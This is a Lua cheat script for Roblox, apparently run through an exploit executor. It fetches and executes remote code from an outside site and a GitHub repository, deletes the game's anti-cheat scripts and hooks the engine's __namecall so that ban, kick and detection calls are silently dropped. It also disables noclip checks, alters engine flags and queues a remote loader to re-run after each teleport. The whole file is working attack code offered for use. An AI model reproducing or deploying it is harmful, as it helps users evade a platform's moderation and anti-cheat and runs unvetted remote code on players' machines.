--[[if syn then
-- offline until further testing loadstring(game:HttpGet('https://raw.githubusercontent.com/mrhackerman35297/AgentCC/main/Sources/GlobalChat'))()
end
local name = game.Players.LocalPlayer.Name
local placeid = game.PlaceId
local jobid = game.JobId

local Players = game:GetService("Players")
Players.PlayerRemoving:Connect(function(v)
if game.Players.LocalPlayer.Name == v.Name then
pcall(function()
loadstring(game:HttpGet("https://9kdestroyer.xyz/PHP_Servers/OnlinePlayer.php?status=offline"))()
end)
end
end)

pcall(function()
loadstring(game:HttpGet("https://9kdestroyer.xyz/PHP_Servers/OnlinePlayer.php?status=online"))()
end)]]
--mod detection v2
loadstring(game:HttpGet("https://9kdestroyer.xyz/ResponseData/AntiMod.txt"))()

function AntiCheat()
  wait(1)
  local me        = game.Players.LocalPlayer
  local mechar    = game.Players.LocalPlayer.Character
  for _, v in next, mechar:GetChildren() do
    if v:IsA('Script') then
      for _, b in next, v:GetChildren() do
        if b:IsA('LocalScript') and b.Parent:IsA('Script') then
          b.Parent:Destroy()
        end
      end 
    end
  end 
end
game.Players.LocalPlayer.CharacterAdded:Connect(AntiCheat)
function RunCheck()
for i, v in pairs(game.Players:GetChildren()) do
    if v.Backpack then
        for _,scripts in pairs(v.Backpack:GetChildren()) do
            if scripts:IsA("LocalScript") then
                if scripts.Name == "AdminBan" then
                    game.Players.LocalPlayer:Kick("[WIP] Anti Ban | Mod Detected : "..v.Name)
                end
            end
        end
    end
end
end
RunCheck()
game.Players.PlayerAdded:Connect(function(v)
    repeat wait() until Workspace.Players:FindFirstChild(v.Name)
    RunCheck()
end)
-- anti remotes
assert(getrawmetatable)
gmt = getrawmetatable(game)
setreadonly(gmt, false)
old = gmt.__namecall
gmt.__namecall =
    newcclosure(
        function(self, ...)
        local args = {...}
        if tostring(args[1]) == "BR_MOBILE" then
            return
        elseif tostring(args[1]) == "TeleportDetect" then
            return
        elseif tostring(args[1]) == "CHECKER_1" then
            return
        elseif tostring(args[1]) == "CHECKER" then
            return
        elseif tostring(args[1]) == "GUI_CHECK" then
            return
        elseif tostring(args[1]) == "OneMoreTime" then
            return
        elseif tostring(args[1]) == "checkingSPEED" then
            return
        elseif tostring(args[1]) == "BANREMOTE" then
            return
        elseif tostring(args[1]) == "PERMAIDBAN" then
            return
        elseif tostring(args[1]) == "KICKREMOTE" then
            return
        elseif tostring(args[1]) == "BR_KICKPC" then
            return end

        return old(self, ...)
    end)
-- // NoClip bypass
xpcall(function()
                    local old
                    old = hookmetamethod(game, "__namecall" ,newcclosure(function(self,...)
                        if not checkcaller() then return old(self,...) end
                        local args = {...}
            
                        if self == PhysicsService then
                            if getnamecallmethod() == "RenameCollisionGroup" then
                                return	RenameCollisionGroup(args[1],args[2])
                            elseif getnamecallmethod() == "RemoveCollisionGroup"  then
                                return	RemoveCollisionGroup(args[1])
                            elseif getnamecallmethod() == "CreateCollisionGroup" then
                                return	CreateCollisionGroup(args[1])
                            elseif getnamecallmethod() == "CollisionGroupSetCollidable" then
                                return CollisionGroupSetCollidable(args[1],args[2],args[3])
                            end
                        end 
            
                        return old(self,...)
                    end))
                end, function()
                    local mt = getrawmetatable(game)
                    local old = mt.__namecall
                    
                    setreadonly(mt,false)
                    
                    mt.__namecall = newcclosure(function(self, ...)
                        if not checkcaller() then return old(self,...) end
                        local args = {...}
            
                        if self == PhysicsService then
                            if getnamecallmethod() == "RenameCollisionGroup" then
                                return	RenameCollisionGroup(args[1],args[2])
                            elseif getnamecallmethod() == "RemoveCollisionGroup"  then
                                return	RemoveCollisionGroup(args[1])
                            elseif getnamecallmethod() == "CreateCollisionGroup" then
                                return	CreateCollisionGroup(args[1])
                            elseif getnamecallmethod() == "CollisionGroupSetCollidable" then
                                return CollisionGroupSetCollidable(args[1],args[2],args[3])
                            end
                        end 
            
                        return old(self,...)
                    end)
            
                    setreadonly(mt,true)
        end)
        setfflag("HumanoidParallelRemoveNoPhysics", "False")
        setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")      

local code = string.format([[
    repeat task.wait() until game:IsLoaded()
    
    wait(1)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/mrhackerman35297/AgentCC/main/Launch.lua"))()

]])
function turnonque()
  if getgenv().turnonqueloaded ~= true then
    getgenv().turnonqueloaded = true
  local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport

  if syn then
    if syn.queue_on_teleport then
      syn.queue_on_teleport(code)
    end
  elseif fluxus then
    if fluxus.queue_on_teleport then
      fluxus.queue_on_teleport(code)
    end
  else
    if queue_on_teleport then
      queue_on_teleport(code)
    end
  end
end
end
turnonque()

